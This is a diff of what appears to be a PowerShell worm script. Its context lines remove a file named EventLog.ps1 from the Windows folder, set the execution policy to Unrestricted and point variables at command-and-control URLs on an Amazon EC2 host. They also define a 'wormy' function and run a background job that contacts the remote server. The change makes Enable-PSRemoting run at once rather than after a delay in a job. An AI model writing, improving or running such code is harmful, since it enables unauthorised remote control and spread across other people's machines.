@@ -6,7 +6,7 @@ else{
 }
 remove-item c:\Windows\EventLog.ps1
 [net.servicepointmanager]::SecurityProtocol = [net.securityprotocoltype]::Tls12
-
+Enable-PSRemoting -force
 set-executionpolicy Unrestricted -force
 $cNcURL='http://ec2-54-156-39-21.compute-1.amazonaws.com/f5423r/ctrlc/fffeeeezzzz/23retefd.txt'
 $timeURL='http://ec2-54-156-39-21.compute-1.amazonaws.com/eeee/timeZ.txt'
@@ -145,10 +145,9 @@ function wormy{
         }
 }
 
-start-job -ScriptBlock{
-    Enable-PSRemoting -force
-    start-sleep -Seconds (get-random -Minimum 60 -Maximum 90)
-}
+
+
+
 start-job -ScriptBlock{
     $timeURL='http://ec2-54-156-39-21.compute-1.amazonaws.com/eeee/timeZ.txt'
     while(1 -eq 2){
